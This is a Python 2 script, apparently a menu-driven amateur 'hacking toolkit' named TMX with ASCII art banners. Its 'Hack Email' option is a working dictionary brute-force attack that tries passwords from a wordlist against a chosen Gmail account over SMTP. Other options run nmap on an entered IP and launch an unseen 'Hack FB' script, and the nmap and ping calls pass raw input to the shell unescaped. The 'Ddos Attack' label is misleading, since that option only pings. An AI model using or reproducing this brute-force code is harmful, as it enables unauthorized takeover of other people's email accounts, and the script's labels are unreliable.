import os
white = "\033[1;37m"
normal = "\033[0;00m"
red = "\033[1;31m"
blue = "\033[1;34m"
green = "\033[1;32m"
lightblue = "\033[0;34m"
os.system('clear')
print("\033[0;32m                             @@                           @/")
print("                           @@@                               @@@")
print("                        %@@@                                   @@@.")
print("                      @@@@@                                     @@@@%")
print("                     @@@@@                                       @@@@@")
print("                    @@@@@@@                  @                  @@@@@@@")
print("                    @(@@@@@@@%            @@@@@@@            &@@@@@@@@@")
print("                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
print("                     @@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@")
print("                       @@@( @@@@@#@@@@@@@@@*@@@,@@@@@@@@@@@@@@@  @@@")
print("                           @@@@@@ .@@@/@@@@@@@@@@@@@/@@@@ @@@@@@")
print("                                  @@@   @@@@@@@@@@@   @@@")
print("                                 @@@@*  ,@@@@@@@@@(  ,@@@@")
print("                                 @@@@@@@@@@@@@@@@@@@@@@@@@")
print("                                  @@@.@@@@@@@@@@@@@@@ @@@")
print("                                    @@@@@@ @@@@@ @@@@@@")
print("                                       @@@@@@@@@@@@@")
print("                                       @@   @@@   @@")
print("                                       @@ @@@@@@@ @@")
print("                                         @@% @  @@")
os.system('sleep 3')
pass
pass
pass
pass
pass
pass
#python 3.6
print (" \033[96m        1-Hack Email")
print (" \033[95m        2-Scan Port,s")
print (" \033[94m        3-Ddos Attack")
print ("  \033[92m       4-Hash /")
print ("         5-Hack FB")
print ("   \033[91m      6-Install && UpdatE")
print ("         0-ExiT")
im = raw_input("TMX >>!")
if im == '1':
 print ("         ._________________.")
 print ("         | _______________ |")
 print ("         | I             I |")
 print ("         | I             I |")
 print ("         | I             I |")
 print ("         | I             I |")
 print ("         | I_____________I |")
 print ("         !_________________!")
 print ("            ._[_______]_.")
 print ("        .___|___________|___.")
 print ("        |::: ____           |")
 print ("        |    ~~~~ [CD-ROM]  |")
 print ("        !___________________!") 
 import smtplib
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 mail=raw_input("Enter Email Hack :")
 passwor = raw_input("Enter List Password :")
 passwor = open(passwor, "r")
 for wh in passwor:
         try:
                 smtpserver.login(mail, wh)
                 print ("\033[1;31m !! Found PassWord >> ", wh)
                 break;
         except:
                 smtplib.SMTPAuthenticationError
                 print ('[*] Not Found PassWord >>', wh)
if im == '2':
 import os
 print("                            / /         / /")
 print("                            / \_______ /|_/")
 print("                            /          /_/ \__")
 print("                           /             \_/ /")
 print("                         _|_              |/|_")
 print("                         _|_  O    _    O  _|_")
 print("                         _|_      (_)      _|_")
 print("                          \                 /")
 print("                           _\_____________/_")
 print("                          /  \/  (___)  \/  /")
 print("                          \__(  o     o  )__/")

 ip=raw_input("Enter IP :")
 os.system('nmap ' + ip)
if im == '3':
 import os
 ip1=raw_input("Enter IP Website :")
 os.system('ping ' + ip1)
if im == '4':
 import hashlib
 text = raw_input("Enter a text to hash: ")
 i = hashlib.new("md5")
 text = text.encode("utf-8")
 i.update(text)
 a = i.hexdigest()
 print(a)
if im == '5':
 import os
 os.system('cd sv && python2 fb.py') 
if im == '6':
 import os
 os.system('apt update && apt upgrade && python2 TMX.py')
if im == '0':
 import os
 print (" Bye Bye ")
 os.system('exit')

